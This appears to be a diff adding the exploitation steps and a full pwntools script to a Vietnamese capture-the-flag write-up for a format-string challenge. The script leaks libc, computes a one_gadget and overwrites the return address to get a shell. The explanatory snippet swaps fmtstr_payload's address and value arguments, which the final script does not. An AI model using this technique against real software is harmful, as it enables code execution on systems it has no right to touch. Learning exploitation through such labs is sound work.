@@ -6,7 +6,7 @@ ___
 ## Cách giải:
 ### Thông tin:
 Kiểm tra thông tin file:
-```                                                                                                
+```python                                                                                                
 ┌──(kali㉿kali)-[~/CTFs/testCTF/fmtstring1]
 └─$ file chall
 chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=27e9b2e732eb3f9bed3b3f248f212ac998a5263a, for GNU/Linux 3.2.0, not stripped
@@ -57,7 +57,7 @@ Note tìm hiểu được: với file 64-bit, 6 arguments đầu tiên của pri
 <img width="806" height="388" alt="image" src="https://github.com/user-attachments/assets/21a9dc96-7f6d-4dd7-9f6d-d5f7ec1de89e" />
 
 Để tính ra vị trí format string của return, ta áp dụng
-```
+```python
 (địa chỉ - rsp)/8 + 6
 ```
 ( `.. + 6` vì format string bắt đầu đọc từ stack tại offset thứ 6)
@@ -91,6 +91,107 @@ Vậy tính libc base mặc định bằng cách:
 ```python
 libc.address = leak_libc - 0x29ca8
 ```
+Kiểm tra:
+
+<img width="808" height="157" alt="image" src="https://github.com/user-attachments/assets/f49f8bf3-e554-4365-90c0-4154cf690727" />
+
+<img width="808" height="810" alt="image" src="https://github.com/user-attachments/assets/78f5a7f1-2198-41cb-8554-c8b8e6b5d26b" />
+
+* Tiếp đến là bước tạo shell, ta sẽ dùng one_gadget:
+
+<img width="808" height="419" alt="image" src="https://github.com/user-attachments/assets/e440daff-286c-456b-8525-07725c47d8bb" />
+
+Tính địa chỉ gadget:
+```
+gadget_offset = 0xddf43
+gadget = libc.address + gadget_offset
+```
+ta sẽ sử dụng format string `%n` với `fmtstr_payload` để overwrite gadget vào return address
+
+và overwrite từng 2 byte một vào return address qua mỗi vòng while (vì viết hết vào thì rất lớn)
+```python
+for i in range(3):
+    value = (gadget >> (16 * i)) & 0xffff
+    
+    position = return_addr + (i * 2)
+    
+    payload = fmtstr_payload(6, {value: position}, write_size='short')
+
+    p.sendline(payload)
+    p.recv()
+```
+
+<img width="802" height="204" alt="image" src="https://github.com/user-attachments/assets/b6284bba-433b-4c90-90c9-8872c15d34c4" />
+<img width="800" height="200" alt="image" src="https://github.com/user-attachments/assets/80df38dd-9022-48c3-afa7-0f2df83a6dd7" />
+<img width="802" height="196" alt="image" src="https://github.com/user-attachments/assets/7ba1f31f-7b23-4aab-938c-29a4aa007620" />
+<img width="808" height="200" alt="image" src="https://github.com/user-attachments/assets/5f8478be-6857-4032-b42d-867d4834c864" />
+<img width="819" height="235" alt="image" src="https://github.com/user-attachments/assets/01ddb9e8-74ae-4145-bf77-eb1df970aa60" />
+
+Script:
+```python
+from pwn import *
+
+exe = context.binary = ELF('./chall', checksec=False)
+context.log_level = 'info'
+
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+	br *main + 38
+	br *main + 53
+
+	x/20gx $rsp
+	tel
+	''')
+
+p = process(exe.path)
+GDB()
+
+# leak 
+payload = b'%3$p' + b' %15$p' 
+p.sendline(payload)
+
+datas = p.recvline().split(b' ')
+buffer = int(datas[0], 16)
+leak_libc = int(datas[1], 16)
+
+log.info(f"Buffer: {hex(buffer)}")
+log.info(f"Leak_libc: {hex(leak_libc)}")
+
+libc.address = leak_libc - 0x29ca8
+
+log.info(f"Libc base: {hex(libc.address)}")
+
+# shell
+return_addr = buffer + 0x48
+
+# 0xddf43
+# 0xfb062
+# 0xfb06a
+# 0xfb06f
+gadget_offset = 0xfb06f
+gadget = libc.address + gadget_offset
+log.info(f"gadget: {hex(gadget)}")
+
+for i in range(3):
+    val_to_write = (gadget >> (16 * i)) & 0xffff
+    
+    where_to_write = return_addr + (i * 2)
+    
+    payload = fmtstr_payload(6, {where_to_write: val_to_write}, write_size='short')
+
+    p.sendline(payload)
+    p.recv()
+
+p.sendline(b'quit')
+
+p.interactive()
+
+# [*] gadget: 0x7f6b1bee6f43
+
+```
+
 
 
 
